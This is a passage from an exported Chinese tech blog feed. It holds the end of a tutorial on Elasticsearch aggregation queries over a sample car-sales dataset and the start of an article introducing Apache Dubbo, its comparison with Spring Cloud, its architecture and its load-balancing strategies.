class="punctuation">:</span> <span class="string">&quot;白色&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;brand&quot;</span><span class="punctuation">:</span><span class="string">&quot;标志&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;model&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;标志408&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;sold_date&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;2021-07-02&quot;</span><span class="punctuation">,</span><span class="attr">&quot;remark&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;比较大的紧凑型车&quot;</span> <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;price&quot;</span> <span class="punctuation">:</span> <span class="number">1998000</span><span class="punctuation">,</span> <span class="attr">&quot;color&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;黑色&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;brand&quot;</span><span class="punctuation">:</span><span class="string">&quot;大众&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;model&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;大众辉腾&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;sold_date&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;2021-08-19&quot;</span><span class="punctuation">,</span><span class="attr">&quot;remark&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;大众最让人肝疼的车&quot;</span> <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;price&quot;</span> <span class="punctuation">:</span> <span class="number">218000</span><span class="punctuation">,</span> <span class="attr">&quot;color&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;红色&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;brand&quot;</span><span class="punctuation">:</span><span class="string">&quot;奥迪&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;model&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;奥迪A4&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;sold_date&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;2021-11-05&quot;</span><span class="punctuation">,</span><span class="attr">&quot;remark&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;小资车型&quot;</span> <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;price&quot;</span> <span class="punctuation">:</span> <span class="number">489000</span><span class="punctuation">,</span> <span class="attr">&quot;color&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;黑色&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;brand&quot;</span><span class="punctuation">:</span><span class="string">&quot;奥迪&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;model&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;奥迪A6&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;sold_date&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;2022-01-01&quot;</span><span class="punctuation">,</span><span class="attr">&quot;remark&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;政府专用？&quot;</span> <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;price&quot;</span> <span class="punctuation">:</span> <span class="number">1899000</span><span class="punctuation">,</span> <span class="attr">&quot;color&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;黑色&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;brand&quot;</span><span class="punctuation">:</span><span class="string">&quot;奥迪&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;model&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;奥迪A 8&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;sold_date&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;2022-02-12&quot;</span><span class="punctuation">,</span><span class="attr">&quot;remark&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;很贵的大A6。。。&quot;</span> <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="简单聚合"><a href="#简单聚合" class="headerlink" title="简单聚合"></a>简单聚合</h2><p>只执行聚合分组，不做复杂的聚合统计。在ES中最基础的聚合为<code>terms</code>，在ES中默认为分组数据做排序时，使用的是<code>doc_count</code>数据执行降序排列，也就是说包含文档越多的分组排在越前面：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">GET /cars/_search</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span>  <span class="comment">// size为0表示不返回原数据，只返回聚合结果</span></span><br><span class="line">  <span class="attr">&quot;aggs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;group_by_color&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;terms&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;field&quot;</span><span class="punctuation">:</span> <span class="string">&quot;color&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;order&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;_count&quot;</span><span class="punctuation">:</span> <span class="string">&quot;desc&quot;</span> <span class="comment">// 默认就是根据该值排序</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="平均值"><a href="#平均值" class="headerlink" title="平均值"></a>平均值</h2><p>本案例先根据color执行聚合分组，在此分组的基础上，对组内数据执行聚合统计，这个组内数据的聚合统计就是metric：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">GET /cars/_search</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;aggs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;group_by_color&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>          <span class="comment">// 根据颜色聚合</span></span><br><span class="line">      <span class="attr">&quot;terms&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;field&quot;</span><span class="punctuation">:</span> <span class="string">&quot;color&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;order&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;avg_by_price&quot;</span><span class="punctuation">:</span> <span class="string">&quot;asc&quot;</span>  <span class="comment">// 根据平均价格排序</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;aggs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;avg_by_price&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>        <span class="comment">// 求出每组的平均价格</span></span><br><span class="line">          <span class="attr">&quot;avg&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;field&quot;</span><span class="punctuation">:</span> <span class="string">&quot;price&quot;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>当然还有更复杂的，先根据color聚合分组，在组内根据brand再次聚合分组，最后求出同一个color分组中每个brand分组的平均价格：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">GET /cars/_search</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;aggs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;group_by_color&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>   <span class="comment">// 根据color分组</span></span><br><span class="line">      <span class="attr">&quot;terms&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;field&quot;</span><span class="punctuation">:</span> <span class="string">&quot;color&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;aggs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;group_by_brand&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>    <span class="comment">// 根据brand分组</span></span><br><span class="line">          <span class="attr">&quot;terms&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;field&quot;</span><span class="punctuation">:</span> <span class="string">&quot;brand&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;order&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;avg_by_price&quot;</span><span class="punctuation">:</span> <span class="string">&quot;desc&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">          <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;aggs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;avg_by_price&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>    <span class="comment">// 最后求brand分组的平均值</span></span><br><span class="line">              <span class="attr">&quot;avg&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;field&quot;</span><span class="punctuation">:</span> <span class="string">&quot;price&quot;</span></span><br><span class="line">              <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="最大最小与总和"><a href="#最大最小与总和" class="headerlink" title="最大最小与总和"></a>最大最小与总和</h2><p>求出每个color分组的最高价格、最低价格和总价格：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">GET /cars/_search</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span> </span><br><span class="line">  <span class="attr">&quot;aggs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;group_by_color&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;terms&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;field&quot;</span><span class="punctuation">:</span> <span class="string">&quot;color&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;aggs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;max_price&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;max&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;field&quot;</span><span class="punctuation">:</span> <span class="string">&quot;price&quot;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;min_price&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;min&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;field&quot;</span><span class="punctuation">:</span> <span class="string">&quot;price&quot;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;sum_price&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;sum&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;field&quot;</span><span class="punctuation">:</span> <span class="string">&quot;price&quot;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>在常见的业务常见中，聚合分析，最常用的种类就是统计数量、最大、最小、平均、总计等。通常占有聚合业务中的60%以上的比例，小型项目中，甚至占比85%以上。</p>
<h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><p>对聚合统计数据进行排序。如统计每个品牌的汽车销量和销售总额，按照销售总额的降序排列：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">GET /cars/_search</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span> </span><br><span class="line">  <span class="attr">&quot;aggs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;group_of_brand&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;terms&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;field&quot;</span><span class="punctuation">:</span> <span class="string">&quot;brand&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;order&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;sum_of_price&quot;</span><span class="punctuation">:</span> <span class="string">&quot;desc&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;aggs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;sum_of_price&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;sum&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;field&quot;</span><span class="punctuation">:</span> <span class="string">&quot;price&quot;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>如果有多层aggs，执行下钻聚合的时候，也可以根据最内层聚合数据执行排序。如：统计每个品牌中每种颜色车辆的销售总额，并根据销售总额降序排列：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">GET /cars/_search</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;aggs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;group_by_brand&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;terms&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;field&quot;</span><span class="punctuation">:</span> <span class="string">&quot;brand&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;aggs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;group_by_color&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;terms&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;field&quot;</span><span class="punctuation">:</span> <span class="string">&quot;color&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;order&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;sum_of_price&quot;</span><span class="punctuation">:</span> <span class="string">&quot;desc&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">          <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;aggs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;sum_of_price&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;sum&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;field&quot;</span><span class="punctuation">:</span> <span class="string">&quot;price&quot;</span></span><br><span class="line">              <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>但是注意：只能组内数据排序，而不能跨组实现排序。</p>
<h2 id="排名"><a href="#排名" class="headerlink" title="排名"></a>排名</h2><p>如果要统计不同brand汽车中价格排名最高的车型该如何做？可以使用<code>top_hits</code>来实现，其中属性如下：</p>
<ul>
<li><code>size</code>代表取组内多少条数据（默认为10）；</li>
<li><code>sort</code>代表组内使用什么字段什么规则排序（默认使用<code>_doc</code>的asc规则排序）；</li>
<li><code>_source</code>代表结果中包含document中的那些字段（默认包含全部字段）。</li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">GET cars/_search</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;aggs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;group_by_brand&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>    <span class="comment">// 根据brand分组</span></span><br><span class="line">      <span class="attr">&quot;terms&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;field&quot;</span><span class="punctuation">:</span> <span class="string">&quot;brand&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;aggs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>           </span><br><span class="line">        <span class="attr">&quot;top_car&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>           <span class="comment">// 统计最高价格的车</span></span><br><span class="line">          <span class="attr">&quot;top_hits&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>        <span class="comment">// 通过top_hits进行统计</span></span><br><span class="line">            <span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span>         <span class="comment">// 只保留一个，那它就是最高的</span></span><br><span class="line">            <span class="attr">&quot;sort&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>          <span class="comment">// 根据价格降序</span></span><br><span class="line">              <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;price&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                  <span class="attr">&quot;order&quot;</span><span class="punctuation">:</span> <span class="string">&quot;desc&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">              <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;_source&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>       <span class="comment">// 只保留model和price字段</span></span><br><span class="line">              <span class="attr">&quot;includes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;model&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;price&quot;</span></span><br><span class="line">              <span class="punctuation">]</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



]]></content>
      <tags>
        <tag>2021</tag>
      </tags>
  </entry>
  <entry>
    <title>Dubbo</title>
    <url>/2021/07/02/2021/Dubbo/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="Dubbo简介"><a href="#Dubbo简介" class="headerlink" title="Dubbo简介"></a>Dubbo简介</h1><h2 id="Dubbo是什么？"><a href="#Dubbo是什么？" class="headerlink" title="Dubbo是什么？"></a>Dubbo是什么？</h2><p><a class="link"   href="http://dubbo.apache.org/en-us/" >Dubbo<i class="fas fa-external-link-alt"></i></a>是阿里巴巴公司开源的一个高性能优秀的服务框架，使得应用可通过高性能的 RPC 实现服务的输出和输入功能，并且可以和Spring框架无缝集成。它提供了三大核心能力：面向接口的远程方法调用，智能容错和负载均衡，以及服务自动注册和发现。</p>
<h2 id="Dubbo和Spring-Cloud有什么区别"><a href="#Dubbo和Spring-Cloud有什么区别" class="headerlink" title="Dubbo和Spring Cloud有什么区别?"></a>Dubbo和Spring Cloud有什么区别?</h2><p>了解<a class="link"   href="https://spring.io/projects/spring-cloud" >Spring Cloud<i class="fas fa-external-link-alt"></i></a>的同学都知道，Spring Cloud框架中也具有远程调用(Feign)、容错(Hystrix)和负载均衡(Ribbon)这三个功能，那么Dubbo和Spring Cloud有什么区别呢？</p>
<h3 id="服务调用方式不同"><a href="#服务调用方式不同" class="headerlink" title="服务调用方式不同"></a>服务调用方式不同</h3><p>服务调用方式是Spring Cloud和Dubbo的最大不同点。</p>
<ul>
<li><p>Spring Cloud的服务调用方式</p>
<p>在Spring Cloud中，我们通过Feign进行<strong>Rest</strong>服务调用（也可以使用其他调用方式），Rest风格大家都比较熟悉，它直接把HTTP作为应用协议。</p>
</li>
<li><p>Dubbo的服务调用方式</p>
<p>在Dubbo中使用的是<strong>RPC</strong>调用，Dubbo采用单一长连接和NIO异步通讯(保持连接&#x2F;轮询处理)，使用自定义报文的TCP协议，并且序列化使用定制Hessian框架。</p>
</li>
<li><p>两者的区别</p>
<p>基于Http的Rest调用是一种非常<strong>灵活</strong>的方式，服务间的依赖性低，有利于<strong>跨语言</strong>的实现以及服务的发布部署。另外，有过开发经验的同学们应该知道，Rest调用的接口是定义在Controller层，适合Swagger接口文档的整合，使得<strong>服务文档一体化</strong>。</p>
<p>而RPC本身没有Rest那么灵活，它本身不支持跨语言，除非进行二次封装。并且RPC的实现更为复杂。但是RPC最大的优点就是适合小数据量大并发的服务调用，服务间的调用<strong>性能更好</strong>。</p>
<p>使用一个包含10个属性的Pojo对象,请求10万次，Dubbo和Spring Could在不同线程数量下，每次请求耗时(ms)如下表：</p>
<table>
<thead>
<tr>
<th>线程数</th>
<th>Dubbo</th>
<th>Spring Cloud</th>
</tr>
</thead>
<tbody><tr>
<td>10线程</td>
<td>2.75</td>
<td>6.52</td>
</tr>
<tr>
<td>20线程</td>
<td>4.18</td>
<td>10.03</td>
</tr>
<tr>
<td>50线程</td>
<td>10.3</td>
<td>28.14</td>
</tr>
<tr>
<td>100线程</td>
<td>20.13</td>
<td>55.23</td>
</tr>
<tr>
<td>200线程</td>
<td>42</td>
<td>110.21</td>
</tr>
</tbody></table>
</li>
</ul>
<h3 id="定位不同"><a href="#定位不同" class="headerlink" title="定位不同"></a>定位不同</h3><p>Dubbo的负责人曾这样说过：</p>
<blockquote>
<p>这里就不得不提到目前的一些文章在谈到微服务的时候总是拿Spring Cloud和Dubbo来对比，需要强调的是<strong>Dubbo未来的定位并不是要成为一个微服务的全面解决方案，而是专注在RPC领域</strong>，成为微服务生态体系中的一个重要组件。至于大家关注的微服务化衍生出的服务治理需求，我们会在Dubbo积极适配开源解决方案，甚至启动独立的开源项目予以支持。</p>
</blockquote>
<p>而Spring Cloud则提供了一整套微服务的解决方啊——服务注册与发现、负载均衡与熔断、网关、调用追踪、分布式配置管理等等。相比之下，Dubbo则着重于RPC领域，其他的很多方面需要借助其他技术框架实现。</p>
<p>打一个不恰当的比方：使用Dubbo构建的微服务架构就像组装电脑，各个环节我们可用自由选择，但木桶效应告诉我们，仅仅一个不恰当的选择可能会大大影响整个架构的性能，但如果你是个高手，这些都不成问题。而Spring Cloud就像品牌机，是经过大量测试组装出来的一台机器，有更高的稳定性，但是如果想要在其中使用非原装的东西，就必须对它有深入的了解。</p>
<h1 id="Dubbo的架构"><a href="#Dubbo的架构" class="headerlink" title="Dubbo的架构"></a>Dubbo的架构</h1><p>官网上Dubbo的架构图如下所示：</p>
<p><a href="https://imgtu.com/i/R2UB1P"><img  
                     lazyload
                     alt="image"
                     data-src="https://z3.ax1x.com/2021/07/03/R2UB1P.jpg"
                      alt="R2UB1P.jpg"
                ></a></p>
<ul>
<li>节点角色说明</li>
</ul>
<table>
<thead>
<tr>
<th>角色</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Provider</td>
<td>暴露服务的服务提供方</td>
</tr>
<tr>
<td>Consumer</td>
<td>调用远程服务的服务消费方</td>
</tr>
<tr>
<td>Registry</td>
<td>服务注册与发现的注册中心</td>
</tr>
<tr>
<td>Monitor</td>
<td>统计服务的调用次数和调用时间的监控中心</td>
</tr>
<tr>
<td>Container</td>
<td>服务运行容器【未在图中标记出</td>
</tr>
</tbody></table>
<p>其中只有Provider和Consumer是我们需要自己编写的，其余的都由Dubbo帮我们封装好了。</p>
<ul>
<li>调用关系说明</li>
</ul>
<ol>
<li>服务容器负责启动，加载，运行服务提供者。</li>
<li>服务提供者在启动时，向注册中心注册自己提供的服务。</li>
<li>服务消费者在启动时，向注册中心订阅自己所需的服务。</li>
<li>注册中心返回服务提供者地址列表给消费者，如果有变更，注册中心将基于长连接推送变更数据给消费者。（例如通过Zookeeper的监听机制或者Redis的发布订阅机制）</li>
<li>服务消费者，从提供者地址列表中，基于负载均衡算法，选一台提供者进行调用，如果调用失败，再选另一台调用。</li>
<li>服务消费者和提供者，在内存中累计调用次数和调用时间，定时每分钟发送一次统计数据到监控中心。</li>
</ol>
<h1 id="Dubbo负载均衡"><a href="#Dubbo负载均衡" class="headerlink" title="Dubbo负载均衡"></a>Dubbo负载均衡</h1><ul>
<li>Random LoadBalance<ul>
<li><strong>随机</strong>，按权重设置随机概率。</li>
<li>在一个截面上碰撞的概率高，但调用量越大分布越均匀，而且按概率使用权重后也比较均匀，有利于动态调整提供者权重。</li>
</ul>
</li>
<li>RoundRobin LoadBalance<ul>
<li><strong>轮询</strong>，按公约后的权重设置轮询比率。</li>
<li>存在慢的提供者累积请求的问题，比如：第二台机器很慢，但没挂，当请求调到第二台时就卡在那，久而久之，所有请求都卡在调到第二台上。</li>
</ul>
</li>
<li>LeastActive LoadBalance<ul>
<li><strong>最少活跃调用数</strong>，相同活跃数的随机，活跃数指调用前后计数差。</li>
<li>使慢的提供者收到更少请求，因为越慢的提供者的调用前后计数差会越大。</li>
</ul>
</li>
<li>ConsistentHash LoadBalance<ul>
<li><strong>一致性 Hash</strong>，相同参数的请求总是发到同一提供者。</li>
<li>当某一台提供者挂时，原本发往该提供者的请求，基于虚拟节点，平摊到其它提供者，不会引起剧烈变动。</li>
